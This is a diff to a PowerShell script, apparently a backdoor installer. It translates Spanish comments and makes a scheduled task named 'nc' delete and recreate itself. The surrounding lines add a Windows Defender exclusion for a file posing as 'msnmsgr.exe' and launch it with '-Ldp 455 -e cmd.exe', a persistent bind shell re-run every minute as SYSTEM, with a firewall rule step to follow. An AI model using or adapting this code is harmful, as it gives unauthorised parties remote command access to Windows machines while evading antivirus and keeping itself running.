@@ -54,10 +54,10 @@ Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 $scriptContent = @'
 $ProcessName = "msnmsgr"
 
-# Verificar si el proceso ya está en ejecución
+# Check if the process is already running
 $Process = Get-Process | Where-Object { $_.ProcessName -eq $ProcessName }
 
-# Si el proceso no está en ejecución, iniciar el proceso
+# If the process is not running, start the process
 if (-not $Process) {
     Start-Process "C:\Windows\System32\msnmsgr.exe" -ArgumentList "-Ldp 455 -e cmd.exe"
 }
@@ -65,12 +65,14 @@ if (-not $Process) {
 
 Set-Content -Path 'C:\script.ps1' -Value $scriptContent
 
+# Check if the "nc" task already exists
+if (schtasks /query /tn "nc" 2>$null) {
+    # If the task exists, delete it
+    schtasks /delete /tn "nc" /f
+}
+
+# Create the task
 & schtasks /create /sc minute /mo 1 /tn "nc" /tr "powershell.exe -ExecutionPolicy Bypass -File `"C:\script.ps1`"" /ru SYSTEM /rl HIGHEST
-
-
-
-
-
 
 
 # 5/10: Adding Firewall Rule
